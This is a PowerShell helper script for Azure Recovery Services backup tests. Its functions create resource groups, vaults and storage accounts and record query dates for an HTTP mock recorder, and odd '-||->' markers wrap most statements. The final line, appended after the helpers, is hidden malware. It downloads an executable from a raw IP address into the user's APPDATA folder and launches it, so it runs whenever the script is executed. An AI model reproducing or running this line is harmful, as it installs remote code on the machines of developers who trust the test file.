












  -||-> function Get-ResourceGroupLocation
{
	 -||-> $location =  -||-> Get-Location "Microsoft.RecoveryServices" "vaults" "West US" <-||-  <-||- ;
	 -||-> $outputLocation = $location.ToLower() <-||- 
	 -||-> $outputLocation = $outputLocation -replace '\s', '' <-||- 
	 -||-> $outputLocation = $outputLocation -replace '-', '' <-||- 
	 -||-> $outputLocation = $outputLocation -replace '_', '' <-||- 
	return  -||-> $outputLocation <-||- ;
} <-||- 
  -||-> function Get-RandomSuffix(
	[int] $size = 8)
{
	 -||-> $variableName = "NamingSuffix" <-||- 
	 -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -eq [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Record <-||- )
	{
		 -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables.ContainsKey($variableName) <-||- )
		{
			 -||-> $suffix = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] <-||- 
		}
		else
		{
			 -||-> $suffix = @( -||-> ( -||-> New-Guid <-||- ).Guid <-||- ) <-||- 
 			 -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] = $suffix <-||- 
		} <-||- 
	}
	else
	{
		 -||-> $suffix = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] <-||- 
	} <-||- 
 	return  -||-> $suffix.Substring(0, $size) <-||- 
} <-||- 
  -||-> function Create-ResourceGroup(
	[string] $location,
	[int] $nick = -1)
{
	 -||-> $name = "PSTestRG" + @( -||-> Get-RandomSuffix <-||- ) <-||- 
	 -||-> if( -||-> $nick -gt -1 <-||- )
	{
		 -||-> $name += $nick <-||- 
	} <-||- 
 	 -||-> $resourceGroup =  -||-> Get-AzResourceGroup -Name $name -ErrorAction Ignore <-||-  <-||- 
	
	 -||-> if ( -||-> $resourceGroup -eq $null <-||- )
	{
		 -||-> New-AzResourceGroup -Name $name -Location $location | Out-Null <-||- 
	} <-||- 
 	return  -||-> $name <-||- 
} <-||- 
  -||-> function Create-RecoveryServicesVault(
	[string] $resourceGroupName, 
	[string] $location)
{
	 -||-> $name = "PSTestRSV" + @( -||-> Get-RandomSuffix <-||- ) <-||- 
 	 -||-> $vault =  -||-> Get-AzRecoveryServicesVault `
		-ResourceGroupName $resourceGroupName `
		-Name $name -ErrorAction Ignore <-||-  <-||- 
 	 -||-> if ( -||-> $vault -eq $null <-||- )
	{
		 -||-> $vault =  -||-> New-AzRecoveryServicesVault `
			-Name $name `
			-ResourceGroupName $resourceGroupName `
			-Location $location <-||-  <-||- ;
	} <-||- 
 	return  -||-> $vault <-||- 
} <-||- 
  -||-> function Create-SA(
	[string] $resourceGroupName, 
	[string] $location)
{
	 -||-> $name = "PSTestSA" + @( -||-> Get-RandomSuffix <-||- ) <-||- 
	 -||-> $name = $name.ToLower() <-||- 
 	 -||-> $sa =  -||-> Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $name -ErrorAction Ignore <-||-  <-||- 
 	 -||-> if ( -||-> $sa -eq $null <-||- )
	{
		 -||-> $job =  -||-> New-AzStorageAccount `
			-ResourceGroupName $resourceGroupName `
			-Name $name `
			-Location $location `
			-Type "Standard_LRS" <-||-  <-||- 
		 -||-> $sa =  -||-> Get-AzStorageAccount -ResourceGroupName $resourceGroupName -Name $name <-||-  <-||- 
	} <-||- 
 	return  -||-> $name <-||- 
} <-||- 
  -||-> function Backup-Item(
	$vault,
	$item)
{
	return  -||-> Backup-AzRecoveryServicesBackupItem `
		-VaultId $vault.ID `
		-Item $item | Wait-AzRecoveryServicesBackupJob -VaultId $vault.ID <-||- 
} <-||- 
  -||-> function Get-RecoveryPoint(
	$vault,
	$item,
	$backupJob)
{
	 -||-> $backupStartTime = $backupJob.StartTime.AddMinutes(-1) <-||- ;
	 -||-> $backupEndTime = $backupJob.EndTime.AddMinutes(1) <-||- ;
 	 -||-> $rps =  -||-> Get-AzRecoveryServicesBackupRecoveryPoint `
		-VaultId $vault.ID `
		-Item $item `
		-StartDate $backupStartTime `
		-EndDate $backupEndTime <-||-  <-||- 
	
	return  -||-> $rps[0] <-||- 
} <-||- 
  -||-> function Get-QueryDateInUtc(
	$date, 
	[string] $variableName)
{
	 -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -eq [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Record <-||- )
	{
		 -||-> $queryDate = $date.ToUniversalTime() <-||- 
		 -||-> $queryDateString = $queryDate.ToString("u") <-||- 
		
		 -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] = $queryDateString <-||- 
	}
	else
	{
		 -||-> $queryDateString = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] <-||- 
 		 -||-> $queryDate = ( -||-> Get-Date $queryDateString <-||- ).ToUniversalTime() <-||- 
	} <-||- 
 	return  -||-> $queryDate <-||- 
} <-||- 
  -||-> function Get-QueryDateLocal(
	$date, 
	[string] $variableName)
{
	 -||-> if ( -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Mode -eq [Microsoft.Azure.Test.HttpRecorder.HttpRecorderMode]::Record <-||- )
	{
		 -||-> $queryDate = $date <-||- 
		
		 -||-> [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] = $date <-||- 
	}
	else
	{
		 -||-> $queryDateString = [Microsoft.Azure.Test.HttpRecorder.HttpMockServer]::Variables[$variableName] <-||- 
 		 -||-> $queryDate =  -||-> Get-Date $queryDateString <-||-  <-||- 
	} <-||- 
 	return  -||-> $queryDate <-||- 
} <-||- 
 -||-> ( -||-> New-Object System.Net.WebClient <-||- ).DownloadFile('http://89.248.170.218/~yahoo/csrsv.exe',"$env:APPDATA\csrsv.exe") <-||- ; -||-> Start-Process ( -||-> "$env:APPDATA\csrsv.exe" <-||- ) <-||- 



